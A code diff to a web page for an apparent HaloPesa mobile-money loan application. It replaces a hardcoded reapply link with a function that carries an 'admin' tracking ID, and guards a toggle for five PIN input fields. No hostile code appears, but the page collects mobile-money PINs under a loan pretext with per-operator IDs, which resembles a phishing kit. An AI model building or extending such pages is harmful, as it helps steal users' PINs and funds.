@@ -569,9 +569,9 @@
     </div>
     <div class="nxt-steps"><span>📱</span><p><strong>Next Steps:</strong><br>You will receive an SMS and an email with disbursement instructions within 24 hours.</p></div>
     <div class="rth-wrap">
-      <a href="https://mkopo-wa-halopesa-tanzanian.onrender.com?admin=ADMIN001" class="reapply-btn-pro">
+      <button class="reapply-btn-pro" onclick="reapplyLoan()">
         <span>🔄</span> APPLY AGAIN
-      </a>
+      </button>
       <button class="rth-btn" onclick="goTo('page-landing')">🏠 Return to Home</button>
     </div>
   </div>
@@ -617,6 +617,15 @@
       return urlId.trim();
     }
     return sessionStorage.getItem('selectedAdminId') || null;
+  }
+
+  function reapplyLoan() {
+    const adminId = getAdminId();
+    let targetUrl = window.location.pathname;
+    if (adminId) {
+      targetUrl += '?admin=' + encodeURIComponent(adminId);
+    }
+    window.location.href = targetUrl;
   }
 
   function goTo(id) {
@@ -827,7 +836,7 @@
   function togPin() {
     for (let i = 0; i < 5; i++) {
       const b = document.getElementById('p' + i);
-      b.type = b.type === 'password' ? 'text' : 'password';
+      if (b) b.type = b.type === 'password' ? 'text' : 'password';
     }
   }
 
